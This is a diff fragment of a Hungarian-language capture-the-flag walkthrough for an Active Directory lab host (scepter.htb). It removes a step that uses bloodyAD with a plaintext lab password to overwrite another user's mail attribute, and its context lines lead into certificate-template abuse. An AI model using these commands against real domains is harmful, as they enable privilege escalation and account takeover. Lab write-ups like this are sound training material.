@@ -165,15 +165,6 @@ bloodyAD -d scepter.htb -u a.carter -p 'NoSecHere!' --host dc01.scepter.htb --dc
 
 ---
 
-## Permission teszt: mail attribútum írás
-
-```bash
-bloodyAD -d scepter.htb -u a.carter -p 'NoSecHere!' --host dc01.scepter.htb set object d.baker mail -v h.brown@scepter.htb
-```
-Ha sikeres: jog rendben.
-
----
-
 ## StaffAccessCertificate template abuse
 
 ```bash
